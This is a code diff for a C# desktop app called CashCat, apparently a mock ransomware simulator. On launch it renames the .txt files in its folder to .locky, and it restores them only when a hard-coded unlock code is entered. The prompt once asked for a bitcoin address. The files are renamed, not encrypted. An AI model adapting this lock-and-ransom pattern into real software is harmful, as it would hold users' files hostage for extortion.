@@ -18,38 +18,31 @@ using System.Windows.Shapes;
 namespace CashCat
 {
 
-
-
     /// <summary>
     /// Interaction logic for MainWindow.xaml
     /// </summary>
     public partial class MainWindow : Window
     {
+
+        private FileSystemOperation fileOperations;
+
         public MainWindow()
         {
             InitializeComponent();
+            fileOperations = new FileSystemOperation();
+            fileOperations.RenameTXTFiles(AppDomain.CurrentDomain.BaseDirectory);
         }
 
+        
         private void Button_Click(object sender, RoutedEventArgs e)
         {
 
-            
-
             if (txtbox_Bitcoingaddess.Text == "123456789")
             {
-                string Location = AppDomain.CurrentDomain.BaseDirectory;
-                DirectoryInfo d = new DirectoryInfo(Location);//Assuming Test is your Folder
-                FileInfo[] Files = d.GetFiles("*.locky"); //Getting Text files
-                string str = "";
-                foreach (FileInfo file in Files)
-                {
-                    Console.WriteLine(file.Name);
-                    string newfilename = (file.Name).Replace(".locky", ".txt");
-                    System.IO.File.Move(file.Name, newfilename);
 
-                }
-
+                fileOperations.UnlockLockyFiles(AppDomain.CurrentDomain.BaseDirectory);
                 MessageBox.Show("Unlocked! Thanks!", "You did it correct", MessageBoxButton.OK);
+
             }
             else
             {
@@ -60,28 +53,13 @@ namespace CashCat
 
         private void txtbox_Bitcoingaddess_GotFocus(object sender, RoutedEventArgs e)
         {
-            if (txtbox_Bitcoingaddess.Text == "BITCOIN Address Here")
+            //Clear Text On Click
+            if (txtbox_Bitcoingaddess.Text == "Unlock Code Here")
             {
                 txtbox_Bitcoingaddess.Text = "";
             }
         }
 
-        private void Window_Initialized(object sender, EventArgs e)
-        {
-            string Location = AppDomain.CurrentDomain.BaseDirectory;
-            //Console.WriteLine("Processed file '{0}'.", Location);
-
-
-            DirectoryInfo d = new DirectoryInfo(Location);//Assuming Test is your Folder
-            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
-            string str = "";
-            foreach (FileInfo file in Files)
-            {
-                Console.WriteLine(file.Name);
-                string newfilename = (file.Name).Replace(".txt", ".locky");
-                System.IO.File.Move(file.Name, newfilename);
-
-            }
-        }
+    
     }
 }
